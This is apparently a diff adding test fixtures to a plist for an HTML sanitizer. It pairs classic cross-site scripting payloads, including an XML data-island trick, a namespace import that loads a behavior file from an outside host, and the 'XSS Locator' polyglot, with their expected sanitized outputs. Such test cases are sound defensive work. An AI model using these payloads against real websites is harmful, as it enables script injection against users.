+		<string>&lt;XML ID=&quot;xss&quot;&gt;&lt;I&gt;&lt;B&gt;&lt;IMG SRC=&quot;javas&lt;!-- --&gt;cript:alert(&apos;XSS&apos;)&quot;&gt;&lt;/B&gt;&lt;/I&gt;&lt;/XML&gt;
+                
+                &lt;SPAN DATASRC=&quot;#xss&quot; DATAFLD=&quot;B&quot; DATAFORMATAS=&quot;HTML&quot;&gt;&lt;/SPAN&gt;</string>
+		<string>&lt;i&gt;&lt;b&gt;&lt;img src=&quot;javas&quot; alt=&quot;javas&amp;lt;!-- --&amp;gt;cript:alert(&apos;XSS&apos;)&quot; /&gt;&lt;/b&gt;&lt;/i&gt;&lt;span&gt;&lt;/span&gt;</string>
+	</array>
+	<key>XML namespace</key>
+	<array>
+		<string>&lt;HTML xmlns:xss&gt;
+                &lt;?import namespace=&quot;xss&quot; implementation=&quot;http://ha.ckers.org/xss.htc&quot;&gt;
+                &lt;xss:xss&gt;XSS&lt;/xss:xss&gt;
+                
+                &lt;/HTML&gt;</string>
+		<string>&amp;lt;?import namespace=&quot;xss&quot; implementation=&quot;http://ha.ckers.org/xss.htc&quot;&amp;gt;
+                XSS</string>
+	</array>
+	<key>XSS Locator</key>
+	<array>
+		<string>&apos;;alert(String.fromCharCode(88,83,83))//\&apos;;alert(String.fromCharCode(88,83,83))//&quot;;alert(String.fromCharCode(88,83,83))//\&quot;;alert(String.fromCharCode(88,83,83))//--&gt;&lt;/SCRIPT&gt;&quot;&gt;&apos;&gt;&lt;SCRIPT&gt;alert(String.fromCharCode(88,83,83))&lt;/SCRIPT&gt;=&amp;{}</string>
+		<string>&apos;;alert(String.fromCharCode(88,83,83))//\&apos;;alert(String.fromCharCode(88,83,83))//&quot;;alert(String.fromCharCode(88,83,83))//\&quot;;alert(String.fromCharCode(88,83,83))//--&amp;gt;&quot;&amp;gt;&apos;&amp;gt;=&amp;amp;{}</string>
+	</array>
+	<key>XSS Quick Test</key>
+	<array>
+		<string>&apos;&apos;;!--&quot;&lt;XSS&gt;=&amp;{()}</string>
+		<string>&apos;&apos;;!--&quot;=&amp;amp;{()}</string>
+	</array>
+</dict>
+</plist>
